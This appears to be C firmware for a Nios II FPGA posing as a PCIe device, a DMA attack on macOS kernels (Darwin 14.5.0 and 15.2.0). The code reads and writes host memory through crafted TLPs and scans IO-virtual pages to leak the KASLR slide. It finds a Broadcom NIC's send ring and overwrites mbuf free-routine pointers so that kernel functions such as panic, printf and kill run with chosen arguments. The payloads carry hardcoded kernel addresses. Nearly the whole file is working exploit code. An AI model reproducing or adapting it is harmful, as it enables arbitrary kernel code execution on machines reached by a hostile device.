#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

#include "sys/alt_timestamp.h"
#include "pcie.h"
#include "pcietlp.h"
#include "baremetalsupport.h"
#include "pcie-backend.h"

#include "mbuf.h"

/*#define COMPLETER_ID 0x8200*/
#define COMPLETER_ID 0xC500


/**
 * Read memory from the host.
 *
 * Parameters:
 *  address: 64 bit virtual IO address to request
 *  read_length: number of bytes to read
 *  timeout: time in ns until we give up
 *  data_buffer: pointer to a buffer to be filled with read result
 *  returned_length: pointed value will be set to number of bytes read
 *
 * Returns:
 *  0 on successful read, 1 otherwise
 */
int32_t memory_read(uint64_t address, uint32_t read_length,
    void *data_buffer, uint64_t timeout, uint32_t *returned_length) {
  static uint32_t tag = 0;

  TLPDoubleWord tlp[64];
  uint64_t timeout_cycles = timeout * 1000;

  int32_t tlp_len = create_memory_request(tlp, sizeof(tlp), TLPD_READ,
      COMPLETER_ID /* requester id */, tag, 0 /* loweraddress */,
      address, read_length);

  uint64_t start_time = read_hw_counter();
  send_tlp((TLPQuadWord *)tlp, tlp_len, NULL, 0, TDA_ALIGNED);
  uint32_t tag_sent = tag;
  // tag from 1 to 31 to avoid clash with status messages
  tag = ((tag + 1) % 31) + 1;

  /*printf("sent\n");*/
  do {
    /*printf("waiting\n");*/
    int32_t received_count = wait_for_tlp((TLPQuadWord *) tlp, sizeof(tlp),
        start_time + timeout_cycles);
    // valid TLPs are >= 12 bytes - wait_for_tlp should also return -1 on timeout
    if (received_count < 12) {
      /*printf("continuing\n");*/
      continue;
    }

    /*printf("sane response\n");*/
    enum tlp_completion_status completion_status = 0;
    uint16_t completer_id = 0, requester_id = 0;
    uint8_t response_tag = 0;
    int32_t parse_status = parse_memory_response(tlp, received_count, data_buffer, read_length,
        &completion_status, &completer_id, &requester_id, &response_tag, returned_length);

    if ((parse_status == 0) && (completion_status == TLPCS_SUCCESSFUL_COMPLETION) &&
        (response_tag == tag_sent)) {
      return 0;
    } else if ((response_tag == tag_sent)) {
      // tag was correct but not successful completion
      return 1;
    }
  } while (read_hw_counter() < start_time + timeout_cycles);
  /*printf("timeout\n");*/

  // if we don't get a successful completion before timeout, return 1
  return 1;
}


/**
 * Write memory to the host. There is currently no way to check the
 * success of this operation.
 *
 * Parameters:
 *  address: 64 bit virtual IO address at which to write
 *  write_length: the number of bytes to write
 *  data_buffer: pointer to a buffer filed with data to write
 */
void memory_write(uint64_t address, uint32_t write_length, void *data_buffer) {
  static uint32_t tag = 0;

  TLPDoubleWord tlp[64];
  uint32_t tlp_len = 0;

  tlp_len = create_memory_request(tlp, sizeof(tlp), TLPD_WRITE,
      COMPLETER_ID /* requester id */, tag, 0 /* loweraddress */,
      address, write_length);

  send_tlp((TLPQuadWord *) tlp, tlp_len, data_buffer, write_length, TDA_ALIGNED);
  tag = (tag + 1) % 32;
}


/**
 * Read arbitrarily-sized blocks of memory from the host, retrying on short counts.
 * This should be used for general reading, as we are ony sure that reads of <=8 bytes
 * at a time will work.
 *
 * Parameters:
 *  address: 64 bit virtual IO address from which to read
 *  read_length: the number of bytes to read
 *  data_buffer: pointer to a buffer to be filled with read result
 *
 * Returns:
 *  0 if all reads successful, 1 otherwise
 */
uint32_t read_buffer(uint64_t address, uint32_t read_length, void *data_buffer) {
  uint64_t overflow = 0; // used to read the last block for non multiple of 8 sizes
  uint32_t status = 0;

  uint32_t read = 0;
  while (read < read_length) {
    void *target = 0;

    // if reading 8 bytes would overflow the buffer, use overflow memory
    int8_t use_overflow = (read_length - read) < 8;
    if (use_overflow) {
      target = &overflow;
    } else {
      target = ((uint8_t *)data_buffer) + read;
    }

    // read an 8 byte block, retrying on short counts
    uint32_t returned_length = 0;
    do {
      status = memory_read(address + read, 8, target, 100000, &returned_length);
      if (status != 0) {
        return status;
      }
    } while (returned_length != 8);

    // if we used overflow memory, copy the appropriate number of bytes to the buffer
    if (use_overflow) {
      memcpy(((uint8_t *)data_buffer) + read, &overflow, read_length - read);
    }

    read += 8;
  }

  return status;
}


/**
 * Write arbitrarily-sized blocks of memory to the host. This should be used
 * for general writing, as we are only sure that writes of <=8 bytes at a time
 * will work. There is no way to guarantee reliability.
 *
 * Parameters:
 *  address: 64 bit virtual IO address at which to write
 *  read_length: the number of bytes to write
 *  data_buffer: pointer to a buffer filled with data to write
 */
void write_buffer(uint64_t address, uint32_t write_length, void *data_buffer) {
  uint32_t written = 0;
  while (written < write_length) {
    uint32_t to_write = 0;

    // write fewer than 8 bytes for the last block of non multiple of 8 sizes
    if ((write_length - written) < 8) {
      to_write = write_length - written;
    } else {
      to_write = 8;
    }

    memory_write(address + written, to_write, ((uint8_t *)data_buffer) + written);
    written += to_write;
  }
}


/**
 * Hexdump from some forgotten source on the internet. Useful for debugging.
 *
 * Parameters:
 *  mem: a buffer to hexdump (NIOS address space)
 *  len: the length of the hexdump
 */
void hexdump(void *mem, uint32_t len) {
  const uint32_t HEXDUMP_COLS = 16;

  for(uint32_t i = 0; i < len +
      ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
    // row label
    if(i % HEXDUMP_COLS == 0) {
      printf("0x%06lx: ", i);
    }

    // values
    if(i < len) {
      printf("%02x ", 0xFF & ((uint8_t *)mem)[i]);
    } else {
      printf("   ");
    }

    // ASCII
    if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
      for(uint32_t j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
        if(j >= len) {
          putchar(' ');
        } else if(isprint(((uint8_t *)mem)[j])) {
          putchar(0xFF & ((uint8_t *)mem)[j]);
        } else {
          putchar('.');
        }
      }
      putchar('\n');
    }
  }
}


/**
 * Given two virtual IO page addresses and a function to process a page of memory,
 * process the pages in the window between the two addresses. If the process function
 * returns a nonzero value, stop exploring and return it. window_start and window_end
 * must be page aligned for this function to work as expected.
 *
 * Parameters:
 *  window_start: the page-aligned virtual IO address of the start of the search window
 *  window_end: the page-aligned virtual IO address of the end of the search window (this
 *    page will be searched too); if this parameter is zero, the function will search
 *    indefinitely until the process function returns a nonzero result
 *  process: a function that takes in a pointer to a page of memory, the IO virtual address of
 *    that memory, and a third argument of 8 bytes and returns 8 bytes
 *  process_arg: the 8 byte third argument to give to process
 *
 * Returns:
 *  the data returned by process if process ever returns a nonzero value, 0 if the specified
 *  window is invalid or process never returns a nonzero result
 */
uint64_t iovirtual_window_explorer(uint64_t window_start, uint64_t window_end,
    uint64_t (*process)(void *, uint64_t, uint64_t), uint64_t process_arg) {
  // specified window had negative size
  if ((window_end != 0) && (window_end < window_start)) {
    return 0;
  }

  // if window_end is 0, loop until something is found; otherwise
  // check the specified window only
  uint64_t iter = window_start;
  uint8_t page[0x1000];
  while ((window_end == 0) || (iter <= window_end)) {
    printf("Trying 0x");
    write_uint_64_hex(iter, '0');
    printf("...\n");
    int32_t status = read_buffer(iter, 4096, page);
    if (status != 0) {
      printf("Bad read...\n");
      iter += 0x1000;
      continue;
    }

    uint64_t result = process(page, iter, process_arg);
    if (result != 0) {
      return result;
    }

    iter += 0x1000;
  }

  // we couldn't find anything interesting in the window
  return 0;
}


/**
 * Process heuristic for use with iovirtual_window_explorer that uses the known
 * static kernel virtual address of a kernel symbol (this can be found with nm) to look
 * for a KASLR shifted address of that symbol on a page. If a shifted address is found,
 * the KASLR slide is calculated and returned. This function assumes that pointers in
 * memory will be 8 byte aligned.
 *
 * Parameters:
 *  mem: pointer to a page of memory
 *  symbol_static_address: the static address of a kernel symbol
 *
 * Returns:
 *  the KASLR slide if the shifted address is found, 0 otherwise
 */
uint64_t kaslr_slide_symbol_process(void *mem, uint64_t unused, uint64_t symbol_static_address) {
  uint64_t *page = (uint64_t *)mem;

  // if we find the desired pointer on this page, return the slide
  for (int32_t i = 0; i < 512; i++) {
    // first 7 hex digits (0xffffff8) and last 5 should be unmodified by KASLR
    if (((page[i] & 0xfffff) == (symbol_static_address & 0xfffff)) &&
        ((page[i] & 0xfffffff000000000) == (symbol_static_address & 0xfffffff000000000))) {
      uint64_t slide = page[i] - symbol_static_address;
      printf("Slide: 0x");
      write_uint_64_hex(slide, '0');
      printf("...\n");
      return slide;
    }
  }

  return 0;
}


/**
 * Process heuristic for use with iovirtual_window_explorer that uses the known
 * layout of a BCM57766-A1's send buffer descriptor to look for a page containing
 * the NIC's send buffer descriptor ring. See the BCM57785 Programmer's Reference Guide
 * page 73 for information about send buffer descriptors.
 *
 * Note: the page containing the send buffer descriptor ring seems to grow as
 * the uptime of the machine. We choose to check for only 16 entries because
 * doing so doesn't seem to give false positives and the ring seems to be that
 * large very shortly after boot.
 *
 * Parameters:
 *  mem: pointer to a page of memory
 *  page_ioaddr: the virtual io address of the page pointed to by mem
 *
 * Returns:
 *  page_ioaddr if the page contains the NIC's send buffer descriptor ring, 0 otherwise
 */
uint64_t BCM57766A1_sendring_process(void *mem, uint64_t page_ioaddr, uint64_t unused) {
  uint64_t *page = (uint64_t *)mem;

  // for each 16 byte send buffer descriptor, the lower 4 bytes of
  // the IO virtual address should be 00, the first byte of
  // the IO virtual address should be 08, and all bytes of
  // the VLAN tag should be 00
  for (int32_t i = 0; i < 16; i++) {
    if (((page[2 * i] & 0xffffffff) != 0) ||
        ((page[2 * i] & 0xff00000000000000) != 0x0800000000000000) ||
        ((page[(2 * i) + 1] & 0xffffffff00000000) != 0)) {
      return 0;
    }
  }

  printf("Window: 0x");
  write_uint_64_hex(page_ioaddr, '0');
  printf("...\n");
  return page_ioaddr;
}


/**
 * Given a pointer to an mbuf with external data, print relevant
 * information about it.
 *
 * Parameters:
 *  mb: a pointer to an mbuf with external data (NIOS address space)
 */
void mbuf_print(struct mbuf *mb) {
  printf("next 0x");
  write_uint_64_hex(mb->m_next, '0');
  printf("\n");
  printf("nextpkt 0x");
  write_uint_64_hex(mb->m_nextpkt, '0');
  printf("\n");
  printf("data 0x");
  write_uint_64_hex(mb->m_data, '0');
  printf("\n");
  printf("len 0x");
  write_uint_64_hex(mb->m_len, '0');
  printf("\n");
  printf("flags 0x");
  write_uint_64_hex(mb->m_flags, '0');
  printf("\n");
  printf("type 0x");
  write_uint_64_hex(mb->m_type, '0');
  printf("\n");
  printf("ext.buf 0x");
  write_uint_64_hex(mb->m_ext.ext_buf, '0');
  printf("\n");
  printf("ext.free 0x");
  write_uint_64_hex(mb->m_ext.ext_free, '0');
  printf("\n");
  printf("ext.size 0x");
  write_uint_64_hex(mb->m_ext.ext_size, '0');
  printf("\n");
  printf("ext.arg 0x");
  write_uint_64_hex(mb->m_ext.ext_arg, '0');
  printf("\n");
  printf("ext.refsq.forward 0x");
  write_uint_64_hex(mb->m_ext.ext_refs.forward, '0');
  printf("\n");
  printf("ext.refsq.backward 0x");
  write_uint_64_hex(mb->m_ext.ext_refs.backward, '0');
  printf("\n");
  printf("ext.refflags 0x");
  write_uint_64_hex(mb->m_ext.ext_refflags, '0');
  printf("\n");
}


/**
 * Overwrite an mbuf's free routine and the first three arguments to that
 * routine. This will also modify the mbuf's buf pointer and size. This function
 * should be called in a payload function after mbuf_prime.
 *
 * Parameters:
 *  mb: pointer to an mbuf
 *  function_kaddr: the kernel virtual address of a function
 *  arg1: the first argument passed into the function pointed to
 *    by function_kaddr when the mbuf is freed
 *  arg2: the second argument to the function
 *  arg3: the third argument to the function
 */
void mbuf_inject(struct mbuf *mb, uint64_t function_kaddr, uint64_t arg1,
    uint64_t arg2, uint64_t arg3) {
  mb->m_ext.ext_free = function_kaddr;
  mb->m_ext.ext_buf = arg1;
  mb->m_ext.ext_size = arg2;
  mb->m_ext.ext_arg = arg3;
}


/** Offset for overwritable space in an mbuf with external storage */
#define MBUF_EXT_OFFSET sizeof(struct m_hdr) + sizeof(struct pkthdr) + sizeof(m_ext_t)

/** Offset for overwriteable space in a primed mbuf */
#define MBUF_PRIMED_OFFSET MBUF_EXT_OFFSET + 8

/**
 * Prime an mbuf for its free routine and arguments to be overwritten. This function
 * should be called in a payload function before mbuf_inject and must be called for
 * the mbuf injection to work correctly. After this function is called, 8 bytes
 * of data will be inserted into the mbuf after the m_ext section so that the payload
 * function has 24 bytes left of the mbuf to use.
 *
 * Parameters:
 *  mb: pointer to an mbuf
 *
 * Returns:
 *  the address of the start of the mbuf in kernel virtual memory - payload functions
 *  should use this for their exploits just in case we need to change the way it's
 *  calculated
 */
uint64_t mbuf_prime(struct mbuf *mb) {
  // this 8 byte field represents an ext_ref struct with refcnt 1 and flags 0 -
  // such an ext_ref (particularly with flags 0) is necessary for our custom free
  // routine to be called without kernel panic (see m_free() of bsd/kern/uipc_mbuf.c)
  *((uint64_t *)((uint8_t *)mb + MBUF_EXT_OFFSET)) = 0x1;

  // m_ext.ext_refs.forward seems to always point to itself in the kernel virtual
  // address space for mbufs with external storage - use this information to
  // obtain a pointer to the start of the mbuf in the kernel virtual address space
  uint64_t mbuf_kern_ptr = mb->m_ext.ext_refs.forward & ~0xff;

  // set m_ext.ext_refflags to the kernel virtual address of the ext_ref struct
  // we created above so that it will be used in processing this mbuf
  mb->m_ext.ext_refflags = mbuf_kern_ptr + MBUF_EXT_OFFSET;

  return mbuf_kern_ptr;
}


/**
 * Given the IO virtual address of a page containing mbufs, iterate over
 * the mbufs and execute the exploit payload on appropriate mbufs until
 * a certain number have been exploited or a certain number of pages has
 * been exhausted.
 *
 * Parameters:
 *  page_addr: the IO virtual adress of a page containing mbufs
 *  num_pages: the number of pages to iterate over - if this is 0, no limit
 *  num_mbufs: the number of mbufs to modify - if this is 0, no limit
 *  payload: the exploit payload function that takes in an mbuf and modifies it
 *
 * Returns:
 *  the number of modified mbufs
 */
uint32_t modify_mbufs(uint64_t page_addr, uint32_t num_pages, uint32_t num_mbufs,
    void (*payload)(struct mbuf *)) {
  uint32_t num_modified = 0;

  uint64_t mbuf_addr = page_addr;
  while (((num_pages == 0) || (mbuf_addr < (page_addr + (num_pages * 0x1000)))) &&
         ((num_mbufs == 0) || (num_modified < num_mbufs))) {
    printf("Reading mbuf: ");
    write_uint_64_hex(mbuf_addr, '0');
    printf("...\n");

    struct mbuf mb;
    int32_t status = read_buffer(mbuf_addr, sizeof(struct mbuf), &mb);
    if (status != 0) {
      printf("Bad read...\n");
      mbuf_addr += sizeof(struct mbuf);
      continue;
    }

    // skip mbufs that are free, don't have external storage, or
    // don't have the forward/backward ext refs pointing to themselves -
    // these will not work (see mbuf_prime)
    if (((mb.m_flags & M_EXT) != M_EXT) || (mb.m_type == MT_FREE)
       /* || (mb.m_ext.ext_refs.forward != mb.m_ext.ext_refs.backward)*/) {
      mbuf_addr += sizeof(struct mbuf);
      continue;
    }

    // execute payload to modify the mbuf
    payload(&mb);

    // write the modified mbuf back
    write_buffer(mbuf_addr, sizeof(struct mbuf), &mb);

    printf("Modified...\n");
    num_modified++;
    mbuf_addr += sizeof(struct mbuf);
  }

  return num_modified;
}


/**
 * Function to execute a BCM57766-A1 mbuf-based exploit. It finds the
 * send descriptor ring then uses the IO virtual pointers therein to
 * find pages containing mbufs. It modifies the mbufs according to
 * the exploit payload.
 *
 * Parameters:
 *  num_mbufs: the number of mbufs to modify
 *  payload: the payload function to modify the mbufs
 */
void BCM57766A1_own(uint32_t num_mbufs, void (*payload)(struct mbuf *)) {
  printf("Finding send descriptor ring window...\n");
  uint64_t iommu_window = iovirtual_window_explorer(0x4c0000, 0,
      BCM57766A1_sendring_process, 0);

  // the mapping opened for the send descriptor ring is 0x2000 bytes
  uint8_t sendring[0x2000];
  int32_t status = read_buffer(iommu_window, sizeof(sendring), sendring);
  if (status != 0) {
    printf("Bad read...\n");
    return;
  }

  uint64_t descriptor_pointer = 0;
  uint32_t i, modified_mbufs = 0;
  while ((i < sizeof(sendring)) && ((num_mbufs == 0) || (modified_mbufs < num_mbufs))) {
    // buffer descriptor pointers are 16 byte aligned - see the
    // BCM57785 Programmer's Reference Guide, page 73
    descriptor_pointer = *(uint64_t *)(&sendring[i]);

    // the pointers are located in the higher four bytes
    // and point to the virtual IO address that the NIC
    // should read data from (i.e. an mbuf or external
    // storage)
    descriptor_pointer >>= 32;

    // descriptor pointers with offset less than 0x20
    // would point into an mbuf header so must point
    // to external storage - the rest seem to point
    // into mbufs
    if ((descriptor_pointer & 0xff) <= 0x20) {
      i += 0x10;
      continue;
    }

    printf("Read buffer descriptor ptr: ");
    write_uint_64_hex(descriptor_pointer, '0');
    printf("...\n");

    descriptor_pointer &= ~0xfff;

    // search through the page containing multiple mbufs
    // and make modifications
    uint32_t modify_param = 0;
    if (num_mbufs == 0) {
      modify_param = 0;
    } else {
      modify_param = num_mbufs - modified_mbufs;
    }
    modified_mbufs += modify_mbufs(descriptor_pointer, 1, modify_param, payload);

    i += 0x10;
  }
}


/**
 * BCM57766-A1 mbuf-based exploit payload that calls panic with arguments we control.
 * Proof of concept exploit. In general, a payload takes in a pointer to an mbuf and
 * modifies its free routine/arguments by making use of mbuf_prime() and mbuf_inject().
 * Works for Darwin kernel version 15.2.0.
 *
 * Parameters:
 *  mb: pointer to an mbuf
 */
void panic_15_2_0(struct mbuf *mb) {
  static uint64_t slide = 0;
  if (slide == 0) {
    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.2.0),
    // whose shifted kernel address should be exposed to IO virtual space by USB and
    // AHCI drivers, to find the KASLR slide
    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b28398;
    printf("Finding KASLR slide...\n");
    slide = iovirtual_window_explorer(0x4d0000, 0,
        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
  }

  // the static kernel address of panic from Darwin 15.2.0
  const uint64_t PANIC_STATIC_KADDR = 0xffffff80002de6b0;
  const uint64_t PRINTF_STATIC_KADDR = 0xffffff80002ee210;

  uint64_t mbuf_kern_ptr = mbuf_prime(mb);

  // set up the format string "%x %x" at the next available 8 byte chunk after priming
  *(uint64_t *)((char *)mb + MBUF_PRIMED_OFFSET) = 0x0000007825207825;

  mbuf_inject(mb, PRINTF_STATIC_KADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET,
      0x1337, 0xdeadbeef);
}

void panic_14_5_0(struct mbuf *mb) {
  static uint64_t slide = 0;
  if (slide == 0) {
    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.2.0),
    // whose shifted kernel address should be exposed to IO virtual space by USB and
    // AHCI drivers, to find the KASLR slide
    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b13f88;
    printf("Finding KASLR slide...\n");
    slide = iovirtual_window_explorer(0x4d0000, 0,
        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
  }

  // the static kernel address of panic from Darwin 15.2.0
  const uint64_t PANIC_STATIC_KADDR = 0xffffff800032ac50;
  uint64_t mbuf_kern_ptr = mbuf_prime(mb);

  // set up the format string "%x %x" at the next available 8 byte chunk after priming
  *(uint64_t *)((char *)mb + MBUF_PRIMED_OFFSET) = 0x0000007825207825;

  mbuf_inject(mb, PANIC_STATIC_KADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET,
      0x1337, 0xdeadbeef);
}



void test(struct mbuf *mb) {
  static uint64_t slide = 0;
  if (slide == 0) {
    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.2.0),
    // whose shifted kernel address should be exposed to IO virtual space by USB and
    // AHCI drivers, to find the KASLR slide
    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b28398;
    printf("Finding KASLR slide...\n");
    slide = iovirtual_window_explorer(0x4d0000, 0,
        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
  }

  // the static kernel address of panic from Darwin 15.2.0
  const uint64_t PANIC_STATIC_KADDR = 0xffffff80002de6b0;
  const uint64_t PRINTF_STATIC_KADDR = 0xffffff80002ee210;
  const uint64_t KILL_STATIC_KADDR = 0xffffff80007b3ab0;

  uint64_t mbuf_kern_ptr = mbuf_prime(mb);

  // set up the format string "%x %x" at the next available 8 byte chunk after priming
  *(uint64_t *)((char *)mb + MBUF_PRIMED_OFFSET) = 0x0000007825207825;

  mbuf_inject(mb, KILL_STATIC_KADDR + slide, 667,
      9, 1);
}


int main() {
  printf("Hello from Nios II!\n");
  usleep(2*1000*1000);
  printf("Starting...\n");
  alt_timestamp_start();

  /*char test[3] = {'a','b','c'};*/
  /*char buf[20];*/
  /*read_buffer(0x4d0000, 20, buf);*/
  /*hexdump(buf, 20);*/
  /*printf("writing\n");*/
  /*write_buffer(0x4d0008, 3, test);*/
  /*read_buffer(0x4d0000, 20, buf);*/
  /*hexdump(buf, 20);*/

  /*char buf[20];*/
  /*printf("reading\n");*/
  /*int status = read_buffer(0x4d0000, 20, buf);*/
  /*printf("done %x\n", status);*/
  /*hexdump(buf, 20);*/

  char buf[20];
  printf("reading\n");
  int status = read_buffer(0x518000, 20, buf);
  printf("done\n");

  /*BCM57766A1_own(0, test);*/


  return 0;
}
